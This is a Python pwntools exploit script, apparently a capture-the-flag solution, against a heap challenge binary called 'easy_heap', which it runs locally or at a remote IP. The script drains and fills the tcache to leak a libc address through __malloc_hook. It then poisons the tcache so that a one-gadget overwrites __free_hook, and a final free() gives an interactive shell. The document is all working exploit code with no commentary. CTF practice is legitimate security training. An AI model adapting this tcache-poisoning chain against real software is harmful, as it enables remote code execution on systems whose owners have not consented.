#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./easy_heap')
if local:
    p = process('./easy_heap')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(size,content):
    ru("which command?\n> ")
    sl('1')
    ru("size \n> ")
    sl(str(size))
    ru("content \n> ")
    sl(content)
def free(index):
    ru("which command?\n> ")
    sl('2')
    ru("index \n> ")
    sl(str(index))
def puts(index):
    ru("which command?\n> ")
    sl('3')
    ru("index \n> ")
    sl(str(index))

def fill_tcache(start,end):
    for i in range(start,end):
        free(i)
def clear_tcache(number,size,content):
    for i in range(number):
        malloc(size,content)
clear_tcache(10,0x2,'a')
fill_tcache(3,10)
free(0)
free(1)#pre100
free(2)#pre200
clear_tcache(7,0x2,'b')
malloc(0x2,'7')
malloc(0x2,'8')
malloc(0x2,'9')

fill_tcache(0,7)
free(7)
clear_tcache(7,0x2,'d')
free(9)
free(8)
malloc(0xf8,'t')
malloc(0x2,'u')
fill_tcache(0,7)
free(8)

clear_tcache(7,0x2,'k')
malloc(0x4,'eight')
puts(7)

malloc_hook = u64(rc(6).ljust(8,'\x00')) - 0x60 - 0x10
print "malloc_hook--->" + hex(malloc_hook)
libc_base = malloc_hook - libc.symbols["__malloc_hook"]
free_hook = libc_base + libc.symbols["__free_hook"]
onegadget = libc_base + 0x4f322
malloc(0x5,'night')

free(7)
free(9)

malloc(0x10,p64(free_hook))
malloc(0x10,p64(free_hook))

fill_tcache(0,8)
clear_tcache(7,0x2,'o')
malloc(0x10,p64(onegadget))
free(9)
p.interactive()